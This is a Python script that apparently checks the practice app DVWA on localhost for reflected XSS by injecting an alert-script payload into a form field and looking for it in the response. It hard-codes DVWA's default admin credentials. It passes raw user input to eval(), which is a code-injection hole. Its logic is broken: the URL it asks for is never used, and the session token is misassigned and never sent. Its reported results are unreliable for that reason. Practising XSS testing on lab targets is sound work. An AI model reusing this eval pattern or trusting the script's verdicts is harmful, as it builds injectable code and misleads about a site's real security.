import requests
from bs4 import BeautifulSoup as bs

BASE_URL = "http://127.0.0.1:80/DVWA"

VALUES = {
    'username': 'admin',
    'password': 'password',
    'Login':'Login'
}

SCRIPT = "<script>alert('XSS')</script>"

INJECT_DATA = {"name" : SCRIPT, "submit" : "Submit"}


def get_user_token() -> str:
    with requests.Session() as c:
        res = c.get(f"{BASE_URL}/login.php")
        soup = bs(res.text, "html.parser")
        cookie = soup.find_all("input", {"type": "hidden"})
        user_token = cookie[0]["value"]
        return user_token
    

COOKIES_JSON = {
    "PHPSESSID": get_user_token(),
    "security": "low"
}


def get_forms(html_page) -> list:
    soup = bs(html_page, "html.parser")
    forms = soup.find_all("form")
    return list(forms)


def main():
    
 
    session = requests.Session()

    url = input("Enter the URL you want to check for an XSS vulnerability:")
    print("Enter the structure of the form you want to check for an XSS vulnerability:  ")
    print("According to the structure of a dictionary, Example: {'name' : ori, 'submit' : 'Submit'}")
    string_form = input("")

    # Get the structure of the form as a dictionary -  change type from string to dictionary:
    dictionary_form = eval(string_form)

    # Get the first key in the dictionary
    first_key = list(dictionary_form.keys())[0]

    # Replace the value in the first place in the dictionary we got to the SCRIPT : 
    dictionary_form[first_key] = SCRIPT

    # Inserting the data and in put the script in the name filed:
    res = requests.get(f"{BASE_URL}/index.php", params = dictionary_form)
    
    # Check i the script saved in the website:
    if SCRIPT in res.text:
        print("Your website is vulnerable to XSS Injection attack!")
    else:
        print("Your website is NOT vulnerable to XSS Injection attack.")




if __name__ == "__main__":
    main()
